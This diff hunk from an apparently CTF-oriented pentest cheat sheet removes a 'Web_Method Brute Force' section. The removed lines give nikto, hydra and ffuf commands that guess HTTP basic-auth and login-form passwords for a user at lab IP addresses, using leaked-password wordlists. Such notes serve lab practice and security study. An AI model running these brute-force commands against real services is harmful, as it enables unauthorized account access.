@@ -170,14 +170,6 @@ pip install -r requirements.txt
 
 RsaCtfTool.py --publickey ./key.pub --private
 ```
-### Web_Method Brute Force ✅
-```bash
-nikto -h http://10.10.131.147:1234/manager/html -id bob:<password> (get-method)
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-get /protected/ -I
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f $ip -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
-
-ffuf -u http://10.10.10.10/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded'
-```
 
 # service ✅📚
 ## SMB ✅
